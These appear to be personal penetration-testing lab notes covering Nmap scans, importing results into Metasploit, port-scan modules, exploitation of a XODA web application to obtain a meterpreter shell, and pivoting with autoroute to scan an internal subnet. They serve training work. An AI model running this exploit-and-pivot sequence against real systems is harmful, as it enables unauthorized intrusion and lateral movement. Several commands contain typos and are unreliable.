# Nmap Script Engine

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 1700–1804. Examples are lab-specific and need verification.

## Nmap Script Engine(NSE):

**Port Scanning and Enumeration With Nmap**

```bash
nmap -Pn IP               //-Pn remove blocking ping problm
nmap -Pn -sV IP
nmap -Pn -sV -O IP -oX windows_server_2012
cat windows_server_2012
```

**Importing Nmap Scan Results into MSF**

msfconsole :msf5

```bash
workspace
workspace -a Win2k12          / -a add name
workspace
clear
db_import /root/windows_server_2012
hosts                  //imported data successfully
services

workspace
workspace -a Nmap_MSF
workspace
db_mmap -Pn -sV -O IP            //nmap within msf
hosts
services
vulns

```

- **Port Scanning with Auxiliary Modules:**

    ```bash
    ifconfig
    service postgresql start
    msfconsole

    ```

    msf:

    ```bash
    workspace -a Port_Scan
    workspace
    search portscan
    //for tcp scan here
    use 5
    clear
    ifconfig
    show options
    set rhosts ip
    show options
    run
    curl target_ip
    search xoda
    use 0
    show options
    set rhosts ip
    set TARGETURI /                / means root
    set lhost host_ip
    show options
    exploit            // get the meterpreter
    ```

    meterpreter:

    ```bash
    sysinfo

    shell
    /bin/bash -i
    ifconfig               eth1 diff ip

    //meterperter
    run autoroute -s eth1_ip
    background

    ```

    msf:

    ```bash
    sessions
    search portscan
    use 5
    set rhosts ip_eth0
    show options
    run
    back

    search udp_sweep
    use 0
    show options
    ifconfig
    set rhosts eht1--2-->3
    run

    ```
